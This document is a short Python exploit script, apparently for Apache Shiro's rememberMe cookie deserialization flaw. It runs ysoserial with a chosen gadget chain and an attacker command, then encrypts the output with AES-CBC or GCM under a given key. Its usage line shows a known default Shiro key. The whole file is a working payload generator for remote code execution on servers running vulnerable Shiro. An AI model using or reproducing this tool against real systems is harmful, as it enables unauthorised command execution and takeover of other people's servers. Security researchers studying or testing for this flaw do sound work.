#coding=utf-8
import requests
import warnings
import uuid
import base64
import subprocess
import random
import hashlib
from Crypto.Cipher import AES
from urllib.parse import urlparse
import sys
import os

#1.4.2及以上版本使用GCM加密
def GCMCipher(key,file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag = cipher.encrypt_and_digest(file_body) 
    ciphertext = ciphertext + tag   
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key,file_body):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def encodeRememberMe(gadget,command,key,mode):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.7-SNAPSHOT-all.jar', gadget, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    file_body = pad(popen.stdout.read())
    if mode == 'CBC':
        return CBCCipher(key,file_body)
    elif mode == 'GCM':
        return GCMCipher(key,file_body)
    
    
if __name__ == '__main__':
    #print encodeRememberMe(sys.argv[])("CommonsCollections8","tomcat","kPH+bIxk5D2deZiIxcaaaA==")
    if len(sys.argv)<5:
        print('encodeRememberMe("CommonsCollections8","tomcat","kPH+bIxk5D2deZiIxcaaaA==","CBC|GCM")')
    else:
        print(encodeRememberMe(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]).decode())
